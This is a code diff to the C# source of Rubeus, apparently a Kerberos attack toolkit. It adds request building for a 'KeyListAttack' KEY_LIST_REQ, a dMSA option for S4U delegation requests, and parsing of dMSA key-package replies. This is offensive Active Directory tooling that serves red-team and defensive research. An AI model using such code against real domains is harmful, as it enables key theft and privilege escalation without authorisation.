@@ -56,12 +56,20 @@ namespace Rubeus {
             value = new PA_FOR_USER(key, name, realm);
         }
 
-        public PA_DATA(byte[] key, string name, string realm, uint nonce, Interop.KERB_ETYPE eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
+        public PA_DATA(byte[] key, string name, string realm, uint nonce, Interop.KERB_ETYPE eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1, bool dmsa = false)
         {
             // used for constrained delegation
             type = Interop.PADATA_TYPE.PA_S4U_X509_USER;
 
-            value = new PA_S4U_X509_USER(key, name, realm, nonce, eType);
+            value = new PA_S4U_X509_USER(key, name, realm, nonce, eType, dmsa);
+        }
+
+        public PA_DATA(Interop.KERB_ETYPE eTYPE)
+        {
+            // KeyListAttack
+            type = Interop.PADATA_TYPE.KEY_LIST_REQ;
+
+            value = new PA_KEY_LIST_REQ(eTYPE);
         }
 
         public PA_DATA(string crealm, string cname, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE etype, bool opsec = false, byte[] req_body = null)
@@ -141,6 +149,12 @@ namespace Rubeus {
                 case Interop.PADATA_TYPE.ETYPE_INFO2:
                     value = new ETYPE_INFO2_ENTRY(AsnElt.Decode(body.Sub[1].Sub[0].CopyValue()));
                     break;
+                case Interop.PADATA_TYPE.SUPERSEDED_BY_USER:
+                    value = new PA_SUPERSEDED_BY_USER(AsnElt.Decode(body.Sub[1].Sub[0].CopyValue()));
+                    break;
+                case Interop.PADATA_TYPE.DMSA_KEY_PACKAGE:
+                    value = new PA_DMSA_KEY_PACKAGE(AsnElt.Decode(body.Sub[1].Sub[0].CopyValue()));
+                    break;
             }
         }
 
@@ -219,6 +233,17 @@ namespace Rubeus {
             else if(type == Interop.PADATA_TYPE.PK_AS_REQ) {
 
                 AsnElt blob = AsnElt.MakeBlob(((PA_PK_AS_REQ)value).Encode().Encode());
+                AsnElt blobSeq = AsnElt.Make(AsnElt.SEQUENCE, new AsnElt[] { blob });
+
+                paDataElt = AsnElt.MakeImplicit(AsnElt.CONTEXT, 2, blobSeq);
+
+                AsnElt seq = AsnElt.Make(AsnElt.SEQUENCE, new AsnElt[] { nameTypeSeq, paDataElt });
+                return seq;
+            }
+            else if (type == Interop.PADATA_TYPE.KEY_LIST_REQ)
+            {
+
+                AsnElt blob = AsnElt.MakeBlob(((PA_KEY_LIST_REQ)value).Encode().Encode());
                 AsnElt blobSeq = AsnElt.Make(AsnElt.SEQUENCE, new AsnElt[] { blob });
 
                 paDataElt = AsnElt.MakeImplicit(AsnElt.CONTEXT, 2, blobSeq);
